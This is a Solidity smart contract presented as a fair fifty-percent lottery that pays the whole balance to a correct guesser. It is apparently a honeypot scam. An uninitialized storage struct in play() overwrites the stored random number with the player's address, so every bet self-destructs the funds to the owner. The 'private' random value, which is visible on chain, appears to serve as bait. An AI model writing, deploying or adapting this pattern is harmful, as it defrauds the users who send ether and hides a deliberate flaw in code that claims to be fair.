1 /*
2 BET NUMBER 0 or 1.IF YOU WIN,THIS CONTRACT WILL AUTOMATIC SEND ALL BALANCE TO YOU.IF YOU LOSE,
3 THIS CONTRACT WILL SEND ALL BALANCE TO OWNER. ENJOY 50%.
4 */
5 
6 pragma solidity ^0.4.19;
7 contract Lottery50chance
8 {
9   // creates random number between 0 and 1 on contract creation
10   uint256 private randomNumber = uint256( keccak256(now) ) % 2;
11   uint256 public minBet = 1 ether;
12   address owner = msg.sender;
13 
14   struct GameHistory 
15   {
16     address player;
17     uint256 number;
18   }
19   
20   GameHistory[] public log;
21 
22   modifier onlyOwner() 
23   {
24     require(msg.sender == owner);
25     _;
26   }
27 
28   function play(uint256 _number) 
29   public 
30   payable 
31   {
32       if(msg.value >= minBet && _number <= 1)
33       {
34           GameHistory gameHistory;
35           gameHistory.player = msg.sender;
36           gameHistory.number = _number;
37           log.push(gameHistory);
38           
39           // if player guesses correctly, transfer contract balance
40           // else transfer to owner
41        
42           if (_number == randomNumber) 
43           {
44               selfdestruct(msg.sender);
45           }else{
46               selfdestruct(owner);
47           }
48           
49       }
50   }
51   
52   //if no one play the game.owner withdraw
53   
54   function withdraw(uint256 amount) 
55   public 
56   onlyOwner 
57   {
58     owner.transfer(amount);
59   }
60 
61   function() public payable { }
62   
63 }